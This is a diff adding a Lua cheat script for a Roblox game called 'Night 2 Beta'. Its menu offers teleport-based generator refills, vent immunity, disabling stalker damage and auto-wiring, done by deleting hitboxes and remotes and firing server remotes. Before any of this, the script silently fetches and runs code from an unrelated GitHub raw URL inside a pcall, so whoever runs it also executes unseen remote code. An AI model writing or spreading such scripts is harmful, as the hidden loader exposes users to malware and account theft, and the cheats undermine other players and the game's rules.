@@ -1,1 +1,156 @@
+task.wait(1)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DAVI98458/Nicescript/refs/heads/main/game%20happy", true))()
+end)
 
+-- Carrega Rayfield
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Cria janela
+local Window = Rayfield:CreateWindow({
+    Name = "Night 2 Beta",
+    LoadingTitle = "Night 2 Beta",
+    LoadingSubtitle = "Shadown_gd",
+    ConfigurationSaving = {
+        Enabled = true,
+        FileName = "Night2BetaConfig"
+    }
+})
+
+-- Aba principal
+local MainTab = Window:CreateTab("Main", 4483362458)
+
+-- Serviços
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local Workspace = game:GetService("Workspace")
+local RS = game:GetService("ReplicatedStorage")
+
+-- Função de teleporte usando HumanoidRootPart
+local function teleportTo(position)
+    local character = player.Character or player.CharacterAdded:Wait()
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    hrp.CFrame = CFrame.new(position)
+end
+
+-- Clicar ClickDetector n vezes
+local function clickDetector(detector, times)
+    for i = 1, times do
+        if detector and detector:IsA("ClickDetector") then
+            fireclickdetector(detector)
+            task.wait(0.1)
+        end
+    end
+end
+
+-- Função Refill Generator
+local function refillGenerator()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local hrp = character:WaitForChild("HumanoidRootPart")
+    local originalPos = hrp.Position
+
+    -- Primeiro teleporte
+    teleportTo(Vector3.new(-317, 83, 98))
+    task.wait(0.2)
+
+    local powerCell = Workspace:FindFirstChild("PowerCell")
+    if powerCell then
+        local detector1 = powerCell:FindFirstChildOfClass("ClickDetector")
+        if detector1 then
+            clickDetector(detector1, 2)
+        end
+    end
+
+    -- Segundo teleporte
+    teleportTo(Vector3.new(-272, 83, 115))
+    task.wait(0.2)
+
+    local detector2 = Workspace:WaitForChild("Generator"):WaitForChild("Detector"):FindFirstChild("ClickDetector")
+    if detector2 then
+        clickDetector(detector2, 2)
+    end
+
+    -- Retorna para o local inicial
+    teleportTo(originalPos)
+end
+
+-- BOTÃO: Refill generator
+MainTab:CreateButton({
+    Name = "Refill generator",
+    Callback = refillGenerator
+})
+
+-- BOTÃO: Anti-Vent
+MainTab:CreateButton({
+    Name = "Anti-Vent",
+    Callback = function()
+        Rayfield:Notify({
+            Title = "Anti-Vent",
+            Content = "Now you are immune to ventilation",
+            Duration = 5
+        })
+
+        local grids = Workspace:FindFirstChild("Grids")
+        if grids then
+            for _, gridel in grids:GetChildren() do
+                if gridel:IsA("Model") then
+                    for _, child in gridel:GetChildren() do
+                        if child:IsA("Part") and child.Name == "Hitbox" then
+                            child:Destroy()
+                        end
+                    end
+                end
+            end
+        end
+    end
+})
+
+-- TOGGLE: Disable Stalker Damage
+MainTab:CreateToggle({
+    Name = "Disable Stalker Damage",
+    CurrentValue = false,
+    Flag = "DisableStalker",
+    Callback = function(state)
+        if state then
+            Rayfield:Notify({
+                Title = "Stalker Damage",
+                Content = "You no longer take damage from the stalker, but you can still die by touching him",
+                Duration = 5
+            })
+
+            local lookAt = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("LookAt")
+            if lookAt then
+                lookAt:Destroy()
+            end
+        end
+    end
+})
+
+-- TOGGLE: Auto Wire
+MainTab:CreateToggle({
+    Name = "Auto Wire",
+    CurrentValue = false,
+    Flag = "AutoWire",
+    Callback = function(state)
+        local Fuses = Workspace:FindFirstChild("FuseBox")
+        if not Fuses then return end
+
+        if state then
+            task.spawn(function()
+                while true do
+                    if not Window.Flags.AutoWire then break end
+
+                    for _, Wire in ipairs(Fuses.Wires:GetChildren()) do
+                        local Sparkles = Wire:FindFirstChild("Sparkles")
+                        if Sparkles and Sparkles.Enabled then
+                            RS.Remotes.ClickWire:FireServer(Wire)
+                            task.wait(0.2)
+                        end
+                    end
+
+                    task.wait(0.2)
+                end
+            end)
+        end
+    end
+})
